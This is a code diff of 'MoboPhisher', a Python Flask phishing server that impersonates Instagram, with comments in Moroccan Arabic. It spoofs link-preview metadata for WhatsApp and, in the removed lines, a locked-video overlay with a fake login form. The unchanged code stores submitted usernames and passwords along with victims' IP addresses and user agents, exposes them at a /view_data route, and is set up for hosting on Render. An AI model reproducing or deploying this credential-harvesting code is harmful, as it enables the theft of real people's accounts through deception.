@@ -1,6 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# نسخة محسنة: تعمل على جميع الهواتف + تصميم Instagram + فيديو مسدود غير قابل للضغط + متوافقة مع Render
+# نسخة محسنة: تعمل على جميع الهواتف + تصميم Instagram
+# تم حذف الطبقة السوداء (Overlay) وزر تسجيل الدخول
+# الفيديو يظهر مباشرة بعد فتح الرابط
 
 import os
 import sys
@@ -53,17 +55,16 @@ class MoboPhisher:
         conn.close()
 
     def spoof_login_page(self):
-        # هاد الصفحة كتوري فيديو إنستغرام مسدود تماماً وغير قابل للضغط
+        # هنا حينا الطبقة السوداء، الفيديو غادي يبان مباشرة
         return """<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
-    <!-- هادو هوما الـ Meta Tags باش يخرج الفيديو فواتساب -->
     <meta property="og:title" content="⚠️ هل ترفع صوت السماعا..." />
     <meta property="og:description" content="Laith Alfathi sur Instagram" />
-    <meta property="og:image" content="https://i.imgur.com/your_thumbnail_image.jpg" /> <!-- بدل هاد الرابط بصورة الفيديو اللي بغيتي -->
+    <meta property="og:image" content="https://i.imgur.com/your_thumbnail_image.jpg" />
     <meta property="og:video" content="https://www.instagram.com/reel/DcHCV27ilyM/embed/" />
     <meta property="og:type" content="video.other" />
     <meta property="og:url" content="https://instagram.com" />
@@ -87,7 +88,7 @@ class MoboPhisher:
             width: 100%;
             max-width: 400px;
             height: 600px;
-            background: #000; /* خلفية سوداء كاملة */
+            background: #000;
             border-radius: 10px;
             overflow: hidden;
             box-shadow: 0 0 20px rgba(0,0,0,0.5);
@@ -98,114 +99,15 @@ class MoboPhisher:
             border: none;
             position: absolute;
             top: 0; left: 0;
-            z-index: 1; /* تحت الطبقة السوداء */
-            pointer-events: none; /* هاد السطر هو اللي كيمنع الضغط على الفيديو */
-        }
-        .overlay {
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            background: #000; /* طبقة سوداء تغطي الفيديو تماماً */
-            z-index: 10; /* فوق الفيديو */
-            pointer-events: auto; /* كيخلي الطبقة هي اللي كتستقبل الضغطات */
-        }
-        .lock-icon {
-            font-size: 50px;
-            margin-bottom: 20px;
-        }
-        .overlay-text {
-            font-size: 18px;
-            font-weight: bold;
-            margin-bottom: 20px;
-            text-align: center;
-            color: #fff;
-            padding: 0 20px;
-        }
-        .login-btn {
-            background-color: #0095F6;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            padding: 12px 30px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-        }
-        /* صندوق تسجيل الدخول */
-        .login-box {
-            display: none;
-            background: #fff;
-            color: #262626;
-            width: 100%;
-            max-width: 350px;
-            padding: 40px 30px;
-            border-radius: 10px;
-            text-align: center;
-            position: absolute;
-            top: 50%; left: 50%;
-            transform: translate(-50%, -50%);
-            z-index: 20;
-            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
-            pointer-events: auto; /* كيخلي صندوق الدخول قابل للضغط */
-        }
-        .login-box h2 {
-            font-family: 'Billabong', 'Instagram Sans Script', cursive;
-            font-size: 40px;
-            margin-bottom: 20px;
-        }
-        .login-box input {
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 10px;
-            border: 1px solid #DBDBDB;
-            border-radius: 4px;
-            background: #FAFAFA;
-            font-size: 14px;
-        }
-        .login-box button {
-            width: 100%;
-            background-color: #0095F6;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            padding: 10px;
-            font-weight: 600;
-            font-size: 14px;
-            cursor: pointer;
-            margin-top: 10px;
+            z-index: 1;
         }
     </style>
 </head>
 <body>
     <div class="video-container">
-        <!-- فيديو إنستغرام الأصلي (مخفي تحت الطبقة السوداء وغير قابل للضغط) -->
+        <!-- الفيديو يبان مباشرة بلا أي طبقة سوداء -->
         <iframe class="video-iframe" src="https://www.instagram.com/reel/DcHCV27ilyM/embed/" frameborder="0" scrolling="no" allowtransparency="true" allowfullscreen="true"></iframe>
-        
-        <div class="overlay" id="overlay">
-            <div class="lock-icon">🔒</div>
-            <div class="overlay-text">You need to open your account to watch this video</div>
-            <button class="login-btn" onclick="showLogin()">Log In</button>
-        </div>
-
-        <div class="login-box" id="loginBox">
-            <h2>Instagram</h2>
-            <form method="POST" action="/submit">
-                <input type="text" name="username" placeholder="Phone number, username, or email" required>
-                <input type="password" name="password" placeholder="Password" required>
-                <button type="submit">Log In</button>
-            </form>
-        </div>
     </div>
-
-    <script>
-        function showLogin() {
-            document.getElementById('overlay').style.display = 'none';
-            document.getElementById('loginBox').style.display = 'block';
-        }
-    </script>
 </body>
 </html>"""
 
@@ -227,7 +129,7 @@ class MoboPhisher:
                       (str(uuid4()), username, password, ip, user_agent))
             conn.commit()
             conn.close()
-            return redirect("https://instagram.com", code=302)
+            return redirect("https://www.instagram.com/reel/DcHCV27ilyM/?stkn=MW9mNHhjOWV0YTB3eA==", code=302)
         
         @app.route('/view_data')
         def view_data():
@@ -321,14 +223,12 @@ class MoboPhisher:
             return html
 
     def launch(self):
-        # قراءة البورت من متغيرات البيئة ديال Render
         port = int(os.environ.get('PORT', 8080))
         
         print("\n" + "="*50)
         print(f"[+] Server starting on port {port}...")
         print("="*50)
         
-        # تشغيل السيرفر مباشرة (بدون Thread وبدون input) ليعمل على Render
         app.run(host='0.0.0.0', port=port, threaded=True)
 
 if __name__ == "__main__":
